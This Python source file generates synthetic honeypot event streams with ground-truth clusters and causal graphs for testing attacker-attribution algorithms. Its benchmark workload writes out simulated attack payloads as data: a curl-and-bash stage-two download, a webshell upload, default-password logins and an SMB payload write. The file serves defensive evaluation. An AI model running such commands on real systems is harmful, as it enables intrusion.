"""
Synthetic Benchmark Scenario Generator & Negative Controls Engine
Implements controlled, reproducible benchmark scenarios with ground-truth causal DAGs,
independent cluster labels, and challenging negative controls.
"""
import random
from typing import Dict, Any, List, Optional
from ground_truth.generator.actor_generator import ActorGenerator, ThreatActor
from ground_truth.generator.topology_generator import TopologyGenerator, HoneypotNode
from ground_truth.generator.event_generator import EventGenerator
from ground_truth.generator.noise_generator import NoiseGenerator
from ground_truth.generator.causal_graph_generator import CausalGraphGenerator
from ground_truth.generator.clock_skew_generator import ClockSkewGenerator

class ScenarioGenerator:
    """
    Generates deterministic benchmark datasets with explicit negative controls.
    """
    def __init__(self, seed: int = 42):
        self.seed = seed
        self.rng = random.Random(seed)
        self.actor_gen = ActorGenerator(seed=seed)
        self.noise_gen = NoiseGenerator(seed=seed)

    def generate_scenario_1_shared_ip_nat(self) -> Dict[str, Any]:
        """
        Negative Control 1: Same IP, Different Attacker (NAT).
        Two distinct attackers share the same public IP.
        Ground truth: Two distinct clusters. Algorithms must NOT merge merely because IP matches.
        """
        shared_ip = "198.51.100.99"
        topology = TopologyGenerator.generate_topology(node_count=3)
        node_ssh = topology[0]
        node_http = topology[1]

        actor_a = self.actor_gen.generate_actor("ACTOR_ALPHA", fixed_ip=shared_ip)
        actor_b = self.actor_gen.generate_actor("ACTOR_BETA", fixed_ip=shared_ip)
        actor_a.preferred_services = ["ssh"]
        actor_b.preferred_services = ["http"]

        events = []
        # Actor A attacks SSH
        for i, tactic in enumerate(["TA0001_Initial_Access", "TA0002_Execution", "TA0006_Credential_Access"]):
            ev = EventGenerator.create_event(
                event_id=f"ev_nat_a_{i+1}",
                actor=actor_a,
                node=node_ssh,
                service="ssh",
                tactic=tactic,
                timestamp_sec=1700000000.0 + (i * 30),
                session_id="sess_nat_alpha_01",
                source_ip=shared_ip
            )
            events.append(ev)

        # Actor B attacks HTTP
        for i, tactic in enumerate(["TA0001_Initial_Access", "TA0007_Discovery", "TA0010_Exfiltration"]):
            ev = EventGenerator.create_event(
                event_id=f"ev_nat_b_{i+1}",
                actor=actor_b,
                node=node_http,
                service="http",
                tactic=tactic,
                timestamp_sec=1700000015.0 + (i * 25),
                session_id="sess_nat_beta_01",
                source_ip=shared_ip
            )
            events.append(ev)

        ground_truth_clusters = {
            "ACTOR_ALPHA": [e["event_id"] for e in events if e["actor_id"] == "ACTOR_ALPHA"],
            "ACTOR_BETA": [e["event_id"] for e in events if e["actor_id"] == "ACTOR_BETA"]
        }

        return {
            "scenario": "SCENARIO_1_SHARED_IP_NAT",
            "seed": self.seed,
            "events": events,
            "ground_truth_clusters": ground_truth_clusters,
            "negative_control": "Algorithms relying solely on IP will produce False Merges (Contamination > 0)"
        }

    def generate_scenario_2_different_ip_same_attacker(self) -> Dict[str, Any]:
        """
        Negative Control 2: Different IP, Same Attacker (Dynamic IP / Multi-Node Pivot).
        A single attacker rotates IP across nodes, but maintains consistent behaviour.
        Ground truth: Single unified cluster. Algorithms relying solely on IP will fail recall.
        """
        topology = TopologyGenerator.generate_topology(node_count=3)
        actor = self.actor_gen.generate_actor("ACTOR_PIVOT", num_ips=2)
        ip1, ip2 = actor.source_ips[0], actor.source_ips[1]

        events = []
        # Stage 1: Initial breach on node 1 using IP1
        ev1 = EventGenerator.create_event(
            event_id="ev_piv_01", actor=actor, node=topology[0], service="ssh",
            tactic="TA0001_Initial_Access", timestamp_sec=1700000100.0,
            session_id="sess_piv_1", source_ip=ip1
        )
        ev2 = EventGenerator.create_event(
            event_id="ev_piv_02", actor=actor, node=topology[0], service="ssh",
            tactic="TA0002_Execution", timestamp_sec=1700000120.0,
            session_id="sess_piv_1", source_ip=ip1
        )
        # Stage 2: Pivot to node 2 using rotated IP2
        ev3 = EventGenerator.create_event(
            event_id="ev_piv_03", actor=actor, node=topology[1], service="http",
            tactic="TA0008_Lateral_Movement", timestamp_sec=1700000150.0,
            session_id="sess_piv_2", source_ip=ip2
        )
        ev4 = EventGenerator.create_event(
            event_id="ev_piv_04", actor=actor, node=topology[1], service="http",
            tactic="TA0010_Exfiltration", timestamp_sec=1700000180.0,
            session_id="sess_piv_2", source_ip=ip2
        )
        events.extend([ev1, ev2, ev3, ev4])

        return {
            "scenario": "SCENARIO_2_DIFFERENT_IP_SAME_ATTACKER",
            "seed": self.seed,
            "events": events,
            "ground_truth_clusters": {
                "ACTOR_PIVOT": [e["event_id"] for e in events]
            },
            "negative_control": "IP-only correlation splits the campaign into 2 clusters (Recall drops to 0.50)"
        }

    def generate_scenario_3_concurrent_attackers(self) -> Dict[str, Any]:
        """
        Negative Control 3: Concurrent Attackers with Overlapping Timestamps.
        Two independent actors operate simultaneously.
        """
        topology = TopologyGenerator.generate_topology(node_count=2)
        actor_a = self.actor_gen.generate_actor("ACTOR_A")
        actor_b = self.actor_gen.generate_actor("ACTOR_B")

        events = []
        # Both actors generate events at exactly the same time offsets
        for i in range(3):
            ev_a = EventGenerator.create_event(
                event_id=f"ev_conc_a_{i+1}", actor=actor_a, node=topology[0],
                service="ssh", tactic="TA0001_Initial_Access",
                timestamp_sec=1700000500.0 + (i * 10), source_ip="192.0.2.10"
            )
            ev_b = EventGenerator.create_event(
                event_id=f"ev_conc_b_{i+1}", actor=actor_b, node=topology[1],
                service="http", tactic="TA0007_Discovery",
                timestamp_sec=1700000500.0 + (i * 10), source_ip="198.51.100.50"
            )
            events.extend([ev_a, ev_b])

        return {
            "scenario": "SCENARIO_3_CONCURRENT_ATTACKERS",
            "seed": self.seed,
            "events": events,
            "ground_truth_clusters": {
                "ACTOR_A": [e["event_id"] for e in events if e["actor_id"] == "ACTOR_A"],
                "ACTOR_B": [e["event_id"] for e in events if e["actor_id"] == "ACTOR_B"]
            }
        }

    def generate_scenario_4_missing_event(self) -> Dict[str, Any]:
        """
        Negative Control 4: Missing Telemetry Event (Packet Loss).
        Campaign step is dropped; tests sequence completeness evaluation.
        """
        base = self.generate_scenario_2_different_ip_same_attacker()
        all_events = base["events"]
        # Drop event 2
        retained_events = [e for e in all_events if e["event_id"] != "ev_piv_02"]
        return {
            "scenario": "SCENARIO_4_MISSING_EVENT",
            "seed": self.seed,
            "events": retained_events,
            "dropped_event_id": "ev_piv_02",
            "ground_truth_clusters": {
                "ACTOR_PIVOT": [e["event_id"] for e in retained_events]
            }
        }

    def generate_scenario_5_duplicate_events(self) -> Dict[str, Any]:
        """
        Negative Control 5: Duplicate Events (Transport Retransmission).
        """
        base = self.generate_scenario_2_different_ip_same_attacker()
        events = list(base["events"])
        # Duplicate the first two events
        events.append(dict(events[0]))
        events.append(dict(events[1]))
        return {
            "scenario": "SCENARIO_5_DUPLICATE_EVENTS",
            "seed": self.seed,
            "events": events,
            "ground_truth_clusters": base["ground_truth_clusters"]
        }

    def generate_scenario_6_out_of_order(self) -> Dict[str, Any]:
        """
        Negative Control 6: Out-of-Order Telemetry.
        Arrival order differs from causal generation order.
        """
        base = self.generate_scenario_2_different_ip_same_attacker()
        events = list(base["events"])
        # Invert arrival order: 3, 1, 4, 2
        shuffled = [events[2], events[0], events[3], events[1]]
        return {
            "scenario": "SCENARIO_6_OUT_OF_ORDER",
            "seed": self.seed,
            "events": shuffled,
            "causal_order": [e["event_id"] for e in events],
            "arrival_order": [e["event_id"] for e in shuffled]
        }

    def generate_custom_benchmark(
        self,
        actors: int = 5,
        events_per_actor: int = 20,
        noise_ratio: float = 0.20,
        clock_skew_ms: float = 500.0,
        network_delay_ms: float = 50.0,
        packet_loss: float = 0.05
    ) -> Dict[str, Any]:
        """
        Generates comprehensive parameterized synthetic benchmark dataset.
        """
        topology = TopologyGenerator.generate_topology(node_count=3)
        threat_actors = self.actor_gen.generate_actors(actors)
        all_events = []
        gt_clusters = {}
        base_time = 1700000000.0

        for a_idx, actor in enumerate(threat_actors):
            actor_events = []
            for ev_idx in range(events_per_actor):
                node = topology[ev_idx % len(topology)]
                service = actor.preferred_services[ev_idx % len(actor.preferred_services)]
                tactic = actor.tactics[ev_idx % len(actor.tactics)]
                ts = base_time + (a_idx * 100) + (ev_idx * 15)
                ev = EventGenerator.create_event(
                    event_id=f"ev_syn_{actor.actor_id}_{ev_idx:03d}",
                    actor=actor,
                    node=node,
                    service=service,
                    tactic=tactic,
                    timestamp_sec=ts
                )
                actor_events.append(ev)
            all_events.extend(actor_events)
            gt_clusters[actor.actor_id] = [e["event_id"] for e in actor_events]

        # Apply noise
        noise_count = int(len(all_events) * noise_ratio)
        noise_events = self.noise_gen.generate_noise_events(
            topology, noise_count, base_time, base_time + 1000
        )
        combined_events = all_events + noise_events

        # Apply packet loss
        if packet_loss > 0:
            combined_events = self.noise_gen.inject_drops(combined_events, drop_rate=packet_loss)

        # Apply clock skew
        combined_events = ClockSkewGenerator.inject_gaussian_drift(
            combined_events, max_skew_sec=clock_skew_ms / 1000.0
        )

        return {
            "scenario": "CUSTOM_SYNTHETIC_BENCHMARK",
            "seed": self.seed,
            "total_events": len(combined_events),
            "actor_count": actors,
            "events": combined_events,
            "ground_truth_clusters": gt_clusters
        }

    def generate_benchmark_workload(
        self,
        seed: Optional[int] = None,
        num_actors: int = 2,
        include_noise: bool = True,
        noise_count: int = 2
    ) -> Dict[str, Any]:
        """
        Dynamically generates unannotated canonical telemetry stream and decoupled
        ground truth clusters/DAG for feature ablation and empirical evaluations.
        Ensures complete decoupling: algorithms receive only unannotated_events.
        """
        rng = random.Random(seed or self.seed)
        topology = TopologyGenerator.generate_topology(node_count=3)
        base_time = 1700000000.0

        events = []
        gt_clusters = {}
        causal_edges = []

        # Actor Alpha: Multi-stage APT with internal pivot (IP rotation + jump token)
        actor_alpha = self.actor_gen.generate_actor("ACTOR_ALPHA", fixed_ip="198.51.100.42", num_ips=1)
        pivot_ip = "192.168.10.5"
        token = "token-jump-pivot-99"

        # Stage 1: Web probe & SSH auth on external IP
        ev_a1 = EventGenerator.create_event(
            event_id="evt_dyn_a1", actor=actor_alpha, node=topology[0], service="http",
            tactic="TA0001_Initial_Access", timestamp_sec=base_time, source_ip="198.51.100.42",
            payload_details={"event_type": "web_probe", "payload": "GET /setup.php HTTP/1.1", "causal_token": None}
        )
        ev_a2 = EventGenerator.create_event(
            event_id="evt_dyn_a2", actor=actor_alpha, node=topology[0], service="ssh",
            tactic="TA0006_Credential_Access", timestamp_sec=base_time + 60, source_ip="198.51.100.42",
            payload_details={"event_type": "auth_login", "payload": "LOGIN admin / admin123", "causal_token": None}
        )
        ev_a3 = EventGenerator.create_event(
            event_id="evt_dyn_a3", actor=actor_alpha, node=topology[0], service="ssh",
            tactic="TA0002_Execution", timestamp_sec=base_time + 120, source_ip="198.51.100.42",
            payload_details={"event_type": "command_exec", "payload": "curl -O http://cdn.io/stage2.sh && bash stage2.sh", "causal_token": token}
        )
        ev_a4 = EventGenerator.create_event(
            event_id="evt_dyn_a4", actor=actor_alpha, node=topology[0], service="http",
            tactic="TA0003_Persistence", timestamp_sec=base_time + 180, source_ip="198.51.100.42",
            payload_details={"event_type": "web_upload", "payload": "POST /upload.php [webshell.php]", "causal_token": token}
        )
        # Stage 2: Pivot to internal node using rotated internal IP
        ev_a5 = EventGenerator.create_event(
            event_id="evt_dyn_a5", actor=actor_alpha, node=topology[1], service="smb",
            tactic="TA0008_Lateral_Movement", timestamp_sec=base_time + 240, source_ip=pivot_ip,
            payload_details={"event_type": "smb_connect", "payload": "SMB2_TREE_CONNECT \\\\node-2\\c$", "causal_token": token}
        )
        ev_a6 = EventGenerator.create_event(
            event_id="evt_dyn_a6", actor=actor_alpha, node=topology[1], service="smb",
            tactic="TA0010_Exfiltration", timestamp_sec=base_time + 300, source_ip=pivot_ip,
            payload_details={"event_type": "payload_write", "payload": "SMB2_WRITE payload.exe", "causal_token": token}
        )

        alpha_events = [ev_a1, ev_a2, ev_a3, ev_a4, ev_a5, ev_a6]
        events.extend(alpha_events)
        gt_clusters["ACTOR_ALPHA"] = [e["event_id"] for e in alpha_events]
        for i in range(len(alpha_events) - 1):
            causal_edges.append({"from": alpha_events[i]["event_id"], "to": alpha_events[i+1]["event_id"]})

        # Actor Beta: Concurrent independent botnet brute-forcer
        actor_beta = self.actor_gen.generate_actor("ACTOR_BETA", fixed_ip="203.0.113.88", num_ips=1)
        ev_b1 = EventGenerator.create_event(
            event_id="evt_dyn_b1", actor=actor_beta, node=topology[1], service="ssh",
            tactic="TA0007_Discovery", timestamp_sec=base_time + 30, source_ip="203.0.113.88",
            payload_details={"event_type": "port_scan", "payload": "TCP SYN probe port 22", "causal_token": None}
        )
        ev_b2 = EventGenerator.create_event(
            event_id="evt_dyn_b2", actor=actor_beta, node=topology[1], service="ssh",
            tactic="TA0001_Initial_Access", timestamp_sec=base_time + 90, source_ip="203.0.113.88",
            payload_details={"event_type": "auth_login", "payload": "LOGIN root / 123456", "causal_token": None}
        )
        ev_b3 = EventGenerator.create_event(
            event_id="evt_dyn_b3", actor=actor_beta, node=topology[1], service="ssh",
            tactic="TA0006_Credential_Access", timestamp_sec=base_time + 150, source_ip="203.0.113.88",
            payload_details={"event_type": "auth_login", "payload": "LOGIN root / password", "causal_token": None}
        )
        beta_events = [ev_b1, ev_b2, ev_b3]
        events.extend(beta_events)
        gt_clusters["ACTOR_BETA"] = [e["event_id"] for e in beta_events]
        for i in range(len(beta_events) - 1):
            causal_edges.append({"from": beta_events[i]["event_id"], "to": beta_events[i+1]["event_id"]})

        # Benign Noise
        if include_noise:
            for n_idx in range(noise_count):
                noise_ip = f"198.18.0.{n_idx + 1}"
                ev_n = {
                    "event_id": f"evt_dyn_noise_{n_idx+1}",
                    "timestamp": base_time + rng.uniform(20, 280),
                    "real_timestamp": base_time + rng.uniform(20, 280),
                    "source_ip": noise_ip,
                    "target_node": f"node-{n_idx % 2 + 1}",
                    "service": "HTTP" if n_idx % 2 == 0 else "NTP",
                    "event_type": "web_probe" if n_idx % 2 == 0 else "ntp_query",
                    "payload": "GET /robots.txt HTTP/1.1" if n_idx % 2 == 0 else "NTP MONLIST request",
                    "causal_token": None
                }
                events.append(ev_n)

        # Build clean unannotated event list (stripping actor_id and ground_truth fields)
        unannotated = []
        for e in events:
            unannotated.append({
                "event_id": e["event_id"],
                "timestamp": e.get("real_timestamp") if e.get("real_timestamp") is not None else e.get("timestamp"),
                "real_timestamp": e.get("real_timestamp") if e.get("real_timestamp") is not None else e.get("timestamp"),
                "source_ip": e.get("source_ip"),
                "target_node": e.get("node_id") or e.get("target_node", "node-1"),
                "service": e.get("service_id") or e.get("service", "unknown"),
                "event_type": e.get("event_type") or (e.get("payload", {}).get("event_type") if isinstance(e.get("payload"), dict) else None) or "unknown",
                "payload": e.get("payload", {}).get("payload") if isinstance(e.get("payload"), dict) else e.get("payload"),
                "causal_token": e.get("payload", {}).get("causal_token") if isinstance(e.get("payload"), dict) else e.get("causal_token")
            })

        return {
            "scenario": "DYNAMIC_BENCHMARK_WORKLOAD",
            "seed": seed or self.seed,
            "unannotated_events": unannotated,
            "ground_truth_clusters": gt_clusters,
            "ground_truth_dag": {
                "nodes": [e["event_id"] for e in events],
                "edges": causal_edges
            }
        }
